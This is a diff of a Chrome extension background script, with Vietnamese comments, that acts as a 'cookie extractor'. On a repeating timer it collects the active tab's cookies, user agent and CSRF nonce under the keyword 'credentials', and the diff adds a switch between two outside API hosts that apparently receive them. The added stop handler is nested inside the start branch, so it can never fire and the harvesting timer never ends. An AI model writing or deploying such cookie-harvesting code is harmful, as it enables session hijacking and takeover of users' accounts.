@@ -1,17 +1,22 @@
 let intervalId = null;
-const urlApi = 'https://api.cyberonegate.com';
+const dev = 'https://api.cyberonegate.com';
+const pro = 'https://api.2hglobalstore.com';
 
 // Hàm lấy cookie và gửi message
-function getCookiesAndSendMessage(storeId, token, csrfNonce) {
+function getCookiesAndSendMessage(storeId, token, csrfNonce, server) {
     chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
+        let urlApi = pro;
+        if(server === "development") {
+            urlApi = dev;
+        }
         if (tabs.length === 0) return;
 
         let tab = tabs[0];
-        let url = new URL(tab.url);
-        let domain = url.hostname;
 
         const cookiesArr = []
         let valid = false;
+
+
 
         setTimeout(
             () => {
@@ -44,6 +49,15 @@ function getCookiesAndSendMessage(storeId, token, csrfNonce) {
 
                         chrome.tabs.sendMessage(tab.id, {action: "getUserAgent"}, (response) => {
                             let userAgent = response?.userAgent || "Không lấy được userAgent";
+
+                            // Gửi dữ liệu đến popup
+                            chrome.runtime.sendMessage({
+                                action: "updatePopupData",
+                                cookies: JSON.stringify(cookiesArr),
+                                userAgent: userAgent,
+                                csrfNonce: csrfNonce
+                            });
+
 
                             const resultData = {
                                 keyword: "credentials",
@@ -86,11 +100,13 @@ function getCookiesAndSendMessage(storeId, token, csrfNonce) {
 
 // Lắng nghe message từ content.js
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
+    console.log(message);
     chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
         if (tabs.length === 0) return;
-        let tabId = tabs[0].id;
 
         if (message.action === "startCookieExtractor") {
+            console.log(message)
+            let server = message.server;
             let token = message.token;
             let storeId = message.storeId;
             let timer = parseFloat(message.timer);
@@ -100,11 +116,19 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             let timerMinutes = timer * 60 * 1000;
 
             // Run RightNow
-            getCookiesAndSendMessage(storeId, token, message.csrfNonce);
+            getCookiesAndSendMessage(storeId, token, message.csrfNonce, server);
 
             // Chạy theo timer
             if (!intervalId) {
-                intervalId = setInterval(() => getCookiesAndSendMessage(storeId, token, message.csrfNonce), timerMinutes);
+                intervalId = setInterval(() => getCookiesAndSendMessage(storeId, token, message.csrfNonce, server), timerMinutes);
+            }
+
+            if (message.action === "finishCookieExtractor") {
+                if (intervalId) {
+                    clearInterval(intervalId);
+                    intervalId = null;
+                    console.log("Đã dừng gửi cookies!");
+                }
             }
         }
     });
